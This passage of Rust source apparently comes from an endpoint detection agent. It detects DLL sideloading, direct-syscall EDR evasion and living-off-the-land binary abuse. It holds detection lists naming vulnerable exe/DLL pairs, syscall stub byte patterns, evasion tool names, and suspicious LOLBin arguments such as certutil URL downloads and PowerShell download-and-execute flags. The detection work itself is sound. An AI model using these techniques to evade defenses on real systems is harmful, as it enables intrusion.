                if cmdline.contains("/proc/self/status") || cmdline.contains("tracerpid") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::AnalysisToolDetection,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "debugger".to_string(),
                        details: "Debugger detection via TracerPid check".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }
            }
        }
    }

    // Helper function to get process name
    #[cfg(target_os = "linux")]
    fn get_process_name(pid: u32) -> String {
        std::fs::read_to_string(format!("/proc/{}/comm", pid))
            .map(|s| s.trim().to_string())
            .unwrap_or_else(|_| "unknown".to_string())
    }

    // Helper function to get process path
    #[cfg(target_os = "linux")]
    fn get_process_path(pid: u32) -> String {
        std::fs::read_link(format!("/proc/{}/exe", pid))
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_else(|_| String::new())
    }
}

// =============================================================================
// Part 1: DLL Sideloading Detection (T1574.002)
// =============================================================================
//
// Detects DLL sideloading by monitoring for known vulnerable binary+DLL pairs
// where the DLL is loaded from the same directory as the host executable,
// especially when the host executable is running from an unexpected path.
//
// Strategy:
//   1. Maintain a list of known sideloading-vulnerable (exe, dll) pairs
//   2. Periodically enumerate running processes, check if any match vulnerable exes
//   3. For matching processes, verify if a suspicious DLL exists adjacent to the exe
//   4. Check whether the exe is running from its expected installation directory
//   5. Optionally verify signature mismatch between host and DLL

/// Known executables vulnerable to DLL sideloading, paired with the DLL they load.
/// Format: (executable_name, sideloaded_dll_name)
const SIDELOAD_VULNERABLE: &[(&str, &str)] = &[
    ("MpCmdRun.exe", "MpClient.dll"),        // Windows Defender
    ("ecls.exe", "version.dll"),             // ESET
    ("teams.exe", "version.dll"),            // Microsoft Teams
    ("OneDriveUpdater.exe", "version.dll"),  // OneDrive
    ("DismHost.exe", "dismcore.dll"),        // DISM
    ("mavinject.exe", "ntdll.dll"),          // Windows
    ("msdt.exe", "sdiagprv.dll"),            // MSDT
    ("msdeploy.exe", "msdeploy.dll"),        // IIS Deploy
    ("WerFault.exe", "faultrep.dll"),        // Windows Error
    ("colorcpl.exe", "colorui.dll"),         // Color Control Panel
    ("consent.exe", "version.dll"),          // UAC consent
    ("ComputerDefaults.exe", "version.dll"), // Computer defaults
    ("logoff.exe", "version.dll"),           // Logoff utility
    ("netplwiz.exe", "version.dll"),         // User accounts
    ("tabcal.exe", "version.dll"),           // Tablet calibration
    ("write.exe", "version.dll"),            // WordPad
    ("dxcap.exe", "version.dll"),            // DirectX diagnostics
    ("eudcedit.exe", "version.dll"),         // Character editor
    ("eventvwr.exe", "version.dll"),         // Event Viewer
    ("iexpress.exe", "version.dll"),         // IExpress
];

/// Expected installation directories for known vulnerable executables.
/// If the executable is running from a directory not in this list, it is suspicious.
/// Format: (executable_name, &[expected_parent_directories])
const SIDELOAD_EXPECTED_PATHS: &[(&str, &[&str])] = &[
    (
        "MpCmdRun.exe",
        &[
            "C:\\Program Files\\Windows Defender",
            "C:\\Program Files (x86)\\Windows Defender",
            "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform",
        ],
    ),
    (
        "teams.exe",
        &[
            "C:\\Users", // Each user's AppData
            "C:\\Program Files\\WindowsApps",
            "C:\\Program Files (x86)\\Microsoft\\Teams",
        ],
    ),
    (
        "OneDriveUpdater.exe",
        &[
            "C:\\Users", // Each user's AppData
            "C:\\Program Files\\Microsoft OneDrive",
            "C:\\Program Files (x86)\\Microsoft OneDrive",
        ],
    ),
    (
        "DismHost.exe",
        &["C:\\Windows\\System32\\Dism", "C:\\Windows\\SysWOW64\\Dism"],
    ),
    (
        "mavinject.exe",
        &["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"],
    ),
    (
        "msdt.exe",
        &["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"],
    ),
    (
        "WerFault.exe",
        &["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"],
    ),
    (
        "colorcpl.exe",
        &["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"],
    ),
    (
        "ecls.exe",
        &["C:\\Program Files\\ESET", "C:\\Program Files (x86)\\ESET"],
    ),
];

impl DefenseEvasionCollector {
    /// Check if an executable path matches any expected installation directory
    fn is_expected_path(exe_name: &str, exe_path: &str) -> bool {
        let exe_path_lower = exe_path.to_lowercase();

        for (name, expected_dirs) in SIDELOAD_EXPECTED_PATHS {
            if exe_name.eq_ignore_ascii_case(name) {
                return expected_dirs
                    .iter()
                    .any(|dir| exe_path_lower.starts_with(&dir.to_lowercase()));
            }
        }

        // If no expected path is configured, check common system directories
        let system_dirs = [
            "c:\\windows\\",
            "c:\\program files\\",
            "c:\\program files (x86)\\",
        ];
        system_dirs
            .iter()
            .any(|dir| exe_path_lower.starts_with(dir))
    }

    /// Direct syscall / indirect syscall detection (T1106).
    ///
    /// Detects processes that contain syscall stubs outside ntdll.dll, which
    /// indicates the use of tools like SysWhispers2/3, Hell's Gate, Halo's Gate,
    /// Tartarus Gate, HookChain, or custom direct-syscall implementations.
    ///
    /// Detection approach:
    /// 1. Enumerate processes and their loaded modules
    /// 2. Identify the ntdll.dll memory range for each process
    /// 3. Scan executable private memory (outside ntdll) for syscall-related byte
    ///    patterns: direct stubs (mov r10, rcx; mov eax, SSN; syscall), indirect
    ///    stubs (jmp r11 / jmp [rip+off] variants), Hell's Gate SSN resolution,
    ///    Halo's Gate neighbor searching, and Tartarus Gate xor-based stubs
    /// 4. Report matches with confidence levels and MITRE T1106 mapping
    #[cfg(target_os = "windows")]
    async fn monitor_direct_syscalls(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting direct syscall detection monitor (T1106)");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Track already-reported (pid, pattern_name) pairs to avoid duplicate alerts
        let mut reported: HashSet<(u32, String)> = HashSet::new();

        // Syscall stub byte patterns and their names/descriptions.
        // These patterns are documented here for reference and used by the
        // MemoryScanner (memory.rs) for deep byte-level scanning. This monitor
        // complements memory scanning with process-level and command-line heuristics.
        //
        // Pattern catalog:
        //   direct_syscall_stub   : [4C 8B D1 B8]                              - mov r10,rcx; mov eax,SSN
        //   tartarus_gate_stub    : [4C 8B D1 33 C0]                           - mov r10,rcx; xor eax,eax; mov al,SSN
        //   hells_gate_ssn_resolve: [8B 40 04]                                 - mov eax,[rax+4]
        //   halos_gate_search     : [66 83 38 0F]                              - cmp word [rax],0x0F05
        //   syscall_ret           : [0F 05 C3]                                 - syscall; ret
        //   nt_alloc_direct       : [4C 8B D1 B8 18 00 00 00 0F 05]           - NtAllocateVirtualMemory SSN 0x18
        //   nt_write_direct       : [4C 8B D1 B8 3A 00 00 00 0F 05]           - NtWriteVirtualMemory SSN 0x3A
        //   nt_protect_direct     : [4C 8B D1 B8 50 00 00 00 0F 05]           - NtProtectVirtualMemory SSN 0x50
        //   nt_create_thread      : [4C 8B D1 B8 C7 00 00 00 0F 05]           - NtCreateThreadEx SSN 0xC7
        //   stack_spoof_setup     : [55 48 89 E5 48 83 EC]                     - push rbp; mov rbp,rsp; sub rsp,N

        // Processes that legitimately contain syscall-like patterns
        // (JIT engines, scripting runtimes, security tools, etc.)
        let whitelist_processes: HashSet<&str> = [
            "msmpeng.exe",
            "mssense.exe",
            "senseir.exe", // Defender
            "csfalconservice.exe",
            "csfalconcontainer.exe", // CrowdStrike
            "sentinelagent.exe",
            "sentinelservicehost.exe", // SentinelOne
            "cb.exe",
            "cbdefense.exe", // Carbon Black
            "elastic-agent.exe",
            "elastic-endpoint.exe", // Elastic
            "java.exe",
            "javaw.exe", // JVM
            "node.exe",  // Node.js
            "python.exe",
            "python3.exe",
            "pythonw.exe", // Python
            "chrome.exe",
            "msedge.exe",
            "firefox.exe", // Browsers
            "vmware-vmx.exe",
            "virtualbox.exe", // VMs
        ]
        .iter()
        .cloned()
        .collect();

        // Suspicious Nt* API names for command-line / loaded-module heuristics
        let suspicious_nt_apis = [
            "ntallocatevirtualmemory",
            "ntwritevirtualmemory",
            "ntprotectvirtualmemory",
            "ntcreatethreadex",
            "ntmapviewofsection",
            "ntqueueapcthread",
            "ntsetcontextthread",
            "ntresumethread",
        ];

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Prune reported entries for processes that no longer exist
            reported.retain(|(pid, _)| system.process(sysinfo::Pid::from_u32(*pid)).is_some());

            for (pid, process) in system.processes() {
                let pid_u32 = pid.as_u32();
                let process_name = process.name().to_string();
                let process_name_lower = process_name.to_lowercase();

                // Skip whitelisted processes
                if whitelist_processes.contains(process_name_lower.as_str()) {
                    continue;
                }

                // Skip system processes
                if pid_u32 <= 4 {
                    continue;
                }

                let exe_path = process
                    .exe()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default();
                let cmdline = process.cmd().join(" ");
                let cmdline_lower = cmdline.to_lowercase();

                // ---------------------------------------------------------------
                // Heuristic 1: Command-line indicators of syscall tooling
                // ---------------------------------------------------------------
                let syscall_tool_indicators = [
                    "syswhispers",
                    "hellsgate",
                    "hells_gate",
                    "hells gate",
                    "halosgate",
                    "halos_gate",
                    "halos gate",
                    "tartarusgate",
                    "tartarus_gate",
                    "tartarus gate",
                    "hookchain",
                    "hook_chain",
                    "freshycalls",
                    "recycledgate",
                    "direct_syscall",
                    "directsyscall",
                ];

                for indicator in &syscall_tool_indicators {
                    if cmdline_lower.contains(indicator) {
                        let report_key = (pid_u32, format!("cmdline_{}", indicator));
                        if reported.contains(&report_key) {
                            continue;
                        }
                        reported.insert(report_key);

                        warn!(
                            pid = pid_u32,
                            process = %process_name,
                            indicator = %indicator,
                            "Syscall evasion tool indicator in command line"
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::DirectSyscall,
                            pid: pid_u32,
                            process_name: process_name.clone(),
                            process_path: exe_path.clone(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: format!("syscall_tool:{}", indicator),
                            details: format!(
                                "Process command line contains syscall evasion tool indicator '{}'. \
                                 This suggests use of direct/indirect syscall techniques to bypass \
                                 EDR hooks (MITRE T1106).",
                                indicator
                            ),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            warn!("Event channel closed");
                            return;
                        }
                    }
                }

                // ---------------------------------------------------------------
                // Heuristic 2: Suspicious Nt* API call sequences in cmdline
                //               (e.g., tools that accept API names as arguments)
                // ---------------------------------------------------------------
                let mut nt_api_count = 0u32;
                let mut matched_apis: Vec<&str> = Vec::new();
                for api in &suspicious_nt_apis {
                    if cmdline_lower.contains(api) {
                        nt_api_count += 1;
                        matched_apis.push(api);
                    }
                }

                // Two or more Nt* APIs in command line is highly suspicious
                if nt_api_count >= 2 {
                    let report_key = (pid_u32, "nt_api_sequence".to_string());
                    if !reported.contains(&report_key) {
                        reported.insert(report_key);

                        warn!(
                            pid = pid_u32,
                            process = %process_name,
                            apis = ?matched_apis,
                            count = nt_api_count,
                            "Suspicious Nt* API sequence in command line"
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::DirectSyscall,
                            pid: pid_u32,
                            process_name: process_name.clone(),
                            process_path: exe_path.clone(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: format!("nt_api_sequence:{}", matched_apis.join(",")),
                            details: format!(
                                "Process references {} suspicious Nt* APIs in command line: [{}]. \
                                 This pattern is consistent with direct syscall injection tools \
                                 that target NtAllocateVirtualMemory/NtWriteVirtualMemory/\
                                 NtProtectVirtualMemory/NtCreateThreadEx in sequence (MITRE T1106).",
                                nt_api_count,
                                matched_apis.join(", ")
                            ),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            warn!("Event channel closed");
                            return;
                        }
                    }
                }

                // ---------------------------------------------------------------
                // Heuristic 3: Memory scan for syscall stubs outside ntdll
                //
                // On Windows, we would use VirtualQueryEx + ReadProcessMemory to
                // enumerate memory regions and scan for patterns outside the
                // ntdll.dll address range. The sysinfo crate does not expose
                // per-region memory details, so we use module-list heuristics
                // and defer deep scanning to the MemoryScanner (memory.rs).
                //
                // Here we check if the process has loaded modules that suggest
                // manual syscall resolution (e.g., a fresh copy of ntdll mapped
                // from disk, or KnownDlls object access).
                // ---------------------------------------------------------------

                // Check for indicators of ntdll remapping (fresh copy technique)
                let modules_hint = cmdline_lower.contains("ntdll")
                    && (cmdline_lower.contains("\\knowndlls\\")
                        || cmdline_lower.contains("mapviewoffile")
                        || cmdline_lower.contains("ntmapviewofsection")
                        || cmdline_lower.contains("copyfile"));

                if modules_hint {
                    let report_key = (pid_u32, "ntdll_remap".to_string());
                    if !reported.contains(&report_key) {
                        reported.insert(report_key);

                        warn!(
                            pid = pid_u32,
                            process = %process_name,
                            "Potential ntdll remapping for direct syscall / unhooking"
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::DirectSyscall,
                            pid: pid_u32,
                            process_name: process_name.clone(),
                            process_path: exe_path.clone(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "ntdll.dll".to_string(),
                            details: format!(
                                "Process appears to remap a fresh copy of ntdll.dll (via \
                                 KnownDlls/MapViewOfFile/NtMapViewOfSection) to extract clean \
                                 syscall stubs or unhook EDR userland hooks. Cmdline: {}",
                                cmdline
                            ),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            warn!("Event channel closed");
                            return;
                        }
                    }
                }

                // ---------------------------------------------------------------
                // Heuristic 4: Process image name matches known syscall tools
                // ---------------------------------------------------------------
                let syscall_tool_names = [
                    "syswhispers",
                    "nanodump",
                    "sharpwhispers",
                    "injecthellsgate",
                    "directsyscall",
                    "hookhunter",
                    "syscallshell",
                    "ntinjector",
                    "syscaller",
                ];

                for tool in &syscall_tool_names {
                    if process_name_lower.contains(tool) {
                        let report_key = (pid_u32, format!("tool_name_{}", tool));
                        if reported.contains(&report_key) {
                            continue;
                        }
                        reported.insert(report_key);

                        warn!(
                            pid = pid_u32,
                            process = %process_name,
                            tool = %tool,
                            "Known syscall evasion tool detected by process name"
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::DirectSyscall,
                            pid: pid_u32,
                            process_name: process_name.clone(),
                            process_path: exe_path.clone(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: format!("syscall_tool_process:{}", tool),
                            details: format!(
                                "Running process '{}' matches known direct syscall / EDR evasion \
                                 tool name '{}'. These tools use techniques like SysWhispers, \
                                 Hell's Gate, Halo's Gate, or Tartarus Gate to invoke NT syscalls \
                                 directly, bypassing userland hooks (MITRE T1106).",
                                process_name, tool
                            ),
                            original_value: None,
                            new_value: None,
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            warn!("Event channel closed");
                            return;
                        }
                    }
                }
            }
        }
    }

    /// Monitor for DLL sideloading on Windows.
    /// Scans running processes for known vulnerable executables, then checks
    /// if a sideloading DLL is present next to the executable.
    #[cfg(target_os = "windows")]
    async fn monitor_dll_sideloading(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use super::{DetectionType, DllSideloadEvent};

        use sysinfo::System;

        info!("Starting DLL sideloading detection monitor (T1574.002)");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Track already-reported (pid, dll_path) pairs to avoid duplicate alerts
        let mut reported: HashSet<(u32, String)> = HashSet::new();

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Prune reported set: remove PIDs no longer running
            reported.retain(|(pid, _)| system.process(sysinfo::Pid::from_u32(*pid)).is_some());

            for (pid, process) in system.processes() {
                let pid_u32 = pid.as_u32();
                let process_name = process.name().to_string();
                let process_name_lower = process_name.to_lowercase();

                // Check if this process matches a known vulnerable executable
                for (vuln_exe, vuln_dll) in SIDELOAD_VULNERABLE {
                    if !process_name_lower.eq_ignore_ascii_case(vuln_exe) {
                        continue;
                    }

                    let exe_path = match process.exe() {
                        Some(p) => p.to_string_lossy().to_string(),
                        None => continue,
                    };

                    // Get the directory containing the executable
                    let exe_dir = match std::path::Path::new(&exe_path).parent() {
                        Some(d) => d,
                        None => continue,
                    };

                    // Check if the sideloading DLL exists in the same directory
                    let dll_path = exe_dir.join(vuln_dll);
                    if !dll_path.exists() {
                        continue;
                    }

                    let dll_path_str = dll_path.to_string_lossy().to_string();

                    // Skip if already reported
                    if reported.contains(&(pid_u32, dll_path_str.clone())) {
                        continue;
                    }

                    // Determine if the exe is in an unexpected location
                    let unexpected_location = !Self::is_expected_path(vuln_exe, &exe_path);

                    // Get signer information for host and DLL
                    let host_signer = Self::get_file_signer(&exe_path);
                    let dll_signer = Self::get_file_signer(&dll_path_str);
                    let signer_mismatch = !host_signer.is_empty()
                        && !dll_signer.is_empty()
                        && host_signer != dll_signer;

                    // Determine severity: unexpected location + signer mismatch = critical
                    let severity = if unexpected_location && signer_mismatch {
                        Severity::Critical
                    } else if unexpected_location || signer_mismatch {
                        Severity::High
                    } else {
                        // Known pair but exe is in expected location -- could be legitimate
                        // Still worth flagging at medium since the DLL exists adjacent
                        Severity::Medium
                    };

                    // Get expected path for display
                    let expected_path = SIDELOAD_EXPECTED_PATHS
                        .iter()
                        .find(|(name, _)| name.eq_ignore_ascii_case(vuln_exe))
                        .map(|(_, dirs)| dirs.join(", "))
                        .unwrap_or_else(|| "system directory".to_string());

                    warn!(
                        exe = %process_name,
                        dll = %vuln_dll,
                        exe_path = %exe_path,
                        dll_path = %dll_path_str,
                        unexpected = %unexpected_location,
                        signer_mismatch = %signer_mismatch,
                        "DLL sideloading detected"
                    );

                    let sideload_event = DllSideloadEvent {
                        host_exe: process_name.clone(),
                        host_path: exe_path.clone(),
                        dll_name: vuln_dll.to_string(),
                        dll_path: dll_path_str.clone(),
                        expected_path: expected_path.clone(),
                        host_signer: host_signer.clone(),
                        dll_signer: dll_signer.clone(),
                        pid: pid_u32,
                        unexpected_location,
                        signer_mismatch,
                    };

                    let mut event = TelemetryEvent::new(
                        EventType::DllSideload,
                        severity,
                        EventPayload::DllSideload(sideload_event),
                    );

                    // Build detection description
                    let mut reasons = Vec::new();
                    if unexpected_location {
                        reasons.push(format!(
                            "executable running from unexpected path (expected: {})",
                            expected_path
                        ));
                    }
                    if signer_mismatch {
                        reasons.push(format!(
                            "DLL signer '{}' does not match host signer '{}'",
                            dll_signer, host_signer
                        ));
                    }
                    reasons.push(format!(
                        "known sideloading pair: {} + {}",
                        vuln_exe, vuln_dll
                    ));

                    let confidence = if unexpected_location && signer_mismatch {
                        0.95
                    } else if unexpected_location {
                        0.85
                    } else if signer_mismatch {
                        0.80
                    } else {
                        0.60
                    };

                    event.add_detection(Detection {
                        detection_type: DetectionType::DllSideloading,
                        rule_name: format!(
                            "dll_sideload_{}_{}",
                            vuln_exe.to_lowercase().replace('.', "_"),
                            vuln_dll.to_lowercase().replace('.', "_")
                        ),
                        confidence,
                        description: format!(
                            "DLL sideloading detected: {} loaded {} from {}. {}",
                            vuln_exe,
                            vuln_dll,
                            exe_dir.display(),
                            reasons.join("; ")
                        ),
                        mitre_tactics: vec![
                            "defense-evasion".to_string(),
                            "persistence".to_string(),
                            "privilege-escalation".to_string(),
                        ],
                        mitre_techniques: vec!["T1574.002".to_string()],
                    });

                    event
                        .metadata
                        .insert("host_exe".to_string(), process_name.clone());
                    event
                        .metadata
                        .insert("host_path".to_string(), exe_path.clone());
                    event
                        .metadata
                        .insert("dll_name".to_string(), vuln_dll.to_string());
                    event
                        .metadata
                        .insert("dll_path".to_string(), dll_path_str.clone());
                    event.metadata.insert(
                        "unexpected_location".to_string(),
                        unexpected_location.to_string(),
                    );
                    event
                        .metadata
                        .insert("signer_mismatch".to_string(), signer_mismatch.to_string());

                    reported.insert((pid_u32, dll_path_str));

                    if tx.send(event).await.is_err() {
                        warn!("Event channel closed");
                        return;
                    }
                }
            }
        }
    }

    /// Get the code signer of a file (Windows).
    /// Returns the signer's subject name or an empty string if unsigned/unavailable.
    #[cfg(target_os = "windows")]
    fn get_file_signer(path: &str) -> String {
        // Use WinVerifyTrust-based signature check from the process collector
        // For simplicity, use a powershell-free approach via the catalog/embedded signature
        use std::process::Command;

        // Try Get-AuthenticodeSignature via powershell (fallback approach)
        let output = Command::new("powershell.exe")
            .args([
                "-NoProfile", "-NonInteractive", "-Command",
                &format!(
                    "(Get-AuthenticodeSignature '{}').SignerCertificate.Subject -replace '.*CN=([^,]+).*','$1'",
                    path.replace('\'', "''")
                ),
            ])
            .output();

        match output {
            Ok(out) if out.status.success() => {
                let signer = String::from_utf8_lossy(&out.stdout).trim().to_string();
                if signer.is_empty() || signer.contains("Error") || signer.contains("Cannot") {
                    String::new()
                } else {
                    signer
                }
            }
            _ => String::new(),
        }
    }

    /// Stub for non-Windows platforms
    #[cfg(not(target_os = "windows"))]
    fn get_file_signer(_path: &str) -> String {
        String::new()
    }
}

// =============================================================================
// Part 2: LOLBin Behavioral Baselining (T1218)
// =============================================================================
//
// Monitors execution of living-off-the-land binaries (LOLBins) and calculates
// a risk score based on:
//   - Command-line argument suspiciousness (match against known-malicious patterns)
//   - Parent process anomaly (LOLBin spawned by unusual parent)
//   - Time-of-day deviation from baseline
//   - User context (admin vs non-admin, service account)
//
// MITRE ATT&CK mappings:
//   - T1218 - System Binary Proxy Execution (parent)
//   - T1218.001 - Compiled HTML File (hh.exe)
//   - T1218.003 - CMSTP
//   - T1218.005 - Mshta
//   - T1218.009 - Regsvcs/Regasm
//   - T1218.010 - Regsvr32
//   - T1218.011 - Rundll32

/// LOLBin registry: known living-off-the-land binaries to monitor
const LOLBINS: &[&str] = &[
    "certutil.exe",
    "mshta.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "wscript.exe",
    "cscript.exe",
    "msiexec.exe",
    "bitsadmin.exe",
    "powershell.exe",
    "cmd.exe",
    "wmic.exe",
    "msbuild.exe",
    "installutil.exe",
    "regasm.exe",
    "regsvcs.exe",
    "cmstp.exe",
    "presentationhost.exe",
    "xwizard.exe",
    "forfiles.exe",
    "pcalua.exe",
    "explorer.exe",
    "hh.exe",
    "control.exe",
    "msconfig.exe",
    "bash.exe",
    "wsl.exe",
    "expand.exe",
    "extrac32.exe",
    "findstr.exe",
    "replace.exe",
    "schtasks.exe",
    "sc.exe",
    "net.exe",
    "net1.exe",
];

/// Suspicious command-line argument patterns mapped per LOLBin.
/// Format: (lolbin_name, &[(pattern, description)])
const LOLBIN_SUSPICIOUS_ARGS: &[(&str, &[(&str, &str)])] = &[
    (
        "certutil.exe",
        &[
            ("-urlcache", "download via URL cache"),
            ("-split", "split output for evasion"),
            ("-decode", "Base64 decode operation"),
            ("-encode", "Base64 encode operation"),
            ("-f http", "forced download from URL"),
            ("-verifyctl", "download via verify CTL"),
            ("-ping", "network connectivity test"),
        ],
    ),
    (
        "mshta.exe",
        &[
            ("vbscript:", "inline VBScript execution"),
            ("javascript:", "inline JavaScript execution"),
            ("http://", "remote HTA execution"),
            ("https://", "remote HTA execution (TLS)"),
            ("about:", "about protocol for script exec"),
        ],
    ),
    (
        "regsvr32.exe",
        &[
            ("/s /n /u /i:http", "scriptlet execution via URL"),
            ("scrobj.dll", "COM scriptlet registration"),
            ("/s /n /u /i:", "silent DLL registration with instance"),
            (".sct", "scriptlet file execution"),
        ],
    ),
    (
        "rundll32.exe",
        &[
            ("javascript:", "JavaScript execution via RunDLL"),
            ("shell32.dll,Control_RunDLL", "Control Panel item execution"),
            ("url.dll,FileProtocolHandler", "file protocol handler abuse"),
            ("zipfldr.dll,RouteTheCall", "ZIP folder extraction abuse"),
            ("advpack.dll,LaunchINFSection", "INF file execution"),
            ("ieadvpack.dll,LaunchINFSection", "IE INF file execution"),
            ("shdocvw.dll,OpenURL", "URL file execution"),
            ("mshtml.dll,PrintHTML", "HTML printing abuse"),
            ("pcwutl.dll,LaunchApplication", "PC wizard launch abuse"),
        ],
    ),
    (
        "wscript.exe",
        &[
            ("//e:vbscript", "explicit VBScript engine"),
            ("//e:jscript", "explicit JScript engine"),
            ("http://", "remote script execution"),
            ("https://", "remote script execution (TLS)"),
        ],
    ),
    (
        "cscript.exe",
        &[
            ("//e:vbscript", "explicit VBScript engine"),
            ("//e:jscript", "explicit JScript engine"),
            ("http://", "remote script execution"),
            ("https://", "remote script execution (TLS)"),
        ],
    ),
    (
        "msiexec.exe",
        &[
            ("/q", "quiet installation"),
            ("http://", "remote MSI install"),
            ("https://", "remote MSI install (TLS)"),
            ("/y", "DLL registration"),
            ("/z", "advertise product"),
        ],
    ),
    (
        "bitsadmin.exe",
        &[
            ("/transfer", "file download via BITS"),
            ("/create", "BITS job creation"),
            ("/addfile", "add file to BITS job"),
            (
                "/setnotifycmdline",
                "command execution via BITS notification",
            ),
            ("/resume", "resume BITS job"),
            ("/complete", "complete BITS job"),
        ],
    ),
    (
        "powershell.exe",
        &[
            ("-enc", "encoded command execution"),
            ("-encodedcommand", "encoded command execution"),
            ("-nop", "no profile (evasion)"),
            ("iex", "invoke expression"),
            ("invoke-expression", "invoke expression"),
            ("downloadstring", "download and execute"),
            ("downloadfile", "file download"),
            ("net.webclient", "web client for download"),
            ("start-bitstransfer", "BITS file transfer"),
            ("-windowstyle hidden", "hidden window execution"),
            ("bypass", "execution policy bypass"),
            ("reflection.assembly", "assembly loading"),
            ("frombase64string", "Base64 decode for execution"),
        ],
    ),
    (
        "cmd.exe",
        &[
            ("/c powershell", "PowerShell invocation via cmd"),
            ("/c certutil", "certutil invocation via cmd"),
            ("/c mshta", "mshta invocation via cmd"),
            ("/c bitsadmin", "bitsadmin invocation via cmd"),
            ("^", "caret obfuscation"),
        ],
    ),
    (
        "wmic.exe",
        &[
            ("process call create", "remote process creation"),
            ("/node:", "remote execution"),
            ("os get", "system enumeration"),
            ("/format:", "XSL script execution"),
        ],
    ),
    (
        "msbuild.exe",
        &[
            (".csproj", "C# project build (task execution)"),
            (".vbproj", "VB project build (task execution)"),
            (".xml", "inline task execution via XML"),
        ],
    ),
    (
        "installutil.exe",
        &[
            ("/logfile=", "InstallUtil execution with log"),
            ("/logtoconsole=false", "silent execution"),
            ("/u", "uninstall trigger for code execution"),
        ],
    ),
    (
        "regasm.exe",
        &[("/u", "unregister trigger for code execution")],
    ),
    (
        "regsvcs.exe",
        &[("/u", "unregister trigger for code execution")],
    ),
    (
        "cmstp.exe",
        &[
            ("/au", "auto install for UAC bypass"),
            ("/ni", "non-interactive install"),
            ("/s", "silent install"),
            (".inf", "INF file execution"),
        ],
    ),
    (
        "forfiles.exe",
        &[
            ("/c", "command execution via forfiles"),
            ("cmd", "cmd invocation via forfiles"),
            ("powershell", "PowerShell invocation via forfiles"),
        ],
    ),
    (
        "pcalua.exe",
        &[("-a", "execute application via program compatibility")],
    ),
    (
        "hh.exe",
        &[
            (".chm", "compiled HTML Help execution"),
            ("http://", "remote CHM execution"),
            ("https://", "remote CHM execution (TLS)"),
        ],
    ),
    (
        "schtasks.exe",
        &[
            ("/create", "scheduled task creation"),
            ("/change", "scheduled task modification"),
            ("/run", "immediate scheduled task execution"),
        ],
    ),
    (
        "sc.exe",
        &[
            ("create", "service creation"),
            ("config", "service configuration change"),
            ("start", "service start"),
        ],
    ),
    ("expand.exe", &[("-f:", "extract from CAB file")]),
    (
        "extrac32.exe",
        &[("/y", "extract CAB silently"), ("/c", "copy from CAB")],
    ),
];

/// Normal parent processes for LOLBins. If a LOLBin is spawned by a parent NOT
/// in this list, the parent is considered anomalous (increasing the risk score).
const LOLBIN_NORMAL_PARENTS: &[&str] = &[
    "explorer.exe",
    "svchost.exe",
    "services.exe",
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "winlogon.exe",
    "userinit.exe",
    "taskhostw.exe",
    "taskeng.exe",
    "wininit.exe",
    "wmiprvse.exe",
    "devenv.exe",
    "code.exe",
    "mmc.exe",
    "dllhost.exe",
    "conhost.exe",
    "sihost.exe",
    "runtimebroker.exe",
    "searchui.exe",
    "searchhost.exe",
    "startmenuexperiencehost.exe",
    "shellexperiencehost.exe",
];

/// Map LOLBin names to their specific MITRE ATT&CK subtechnique IDs
fn lolbin_mitre_technique(lolbin_name: &str) -> (&'static str, &'static str) {
    match lolbin_name {
        "hh.exe" => ("T1218.001", "Compiled HTML File"),
        "cmstp.exe" => ("T1218.003", "CMSTP"),
        "mshta.exe" => ("T1218.005", "Mshta"),
        "msiexec.exe" => ("T1218.007", "Msiexec"),
        "regsvcs.exe" | "regasm.exe" => ("T1218.009", "Regsvcs/Regasm"),
        "regsvr32.exe" => ("T1218.010", "Regsvr32"),
        "rundll32.exe" => ("T1218.011", "Rundll32"),
        "msbuild.exe" | "installutil.exe" => ("T1127.001", "Trusted Developer Utilities"),
        "certutil.exe" => ("T1140", "Deobfuscate/Decode Files"),
        "bitsadmin.exe" => ("T1197", "BITS Jobs"),
        "wmic.exe" => ("T1047", "Windows Management Instrumentation"),
        "powershell.exe" | "pwsh.exe" => ("T1059.001", "PowerShell"),
        "cmd.exe" => ("T1059.003", "Windows Command Shell"),
        "wscript.exe" | "cscript.exe" => ("T1059.005", "Visual Basic"),
        "schtasks.exe" => ("T1053.005", "Scheduled Task"),
        "sc.exe" => ("T1543.003", "Windows Service"),
        "forfiles.exe" | "pcalua.exe" => ("T1202", "Indirect Command Execution"),
        _ => ("T1218", "System Binary Proxy Execution"),
    }
}

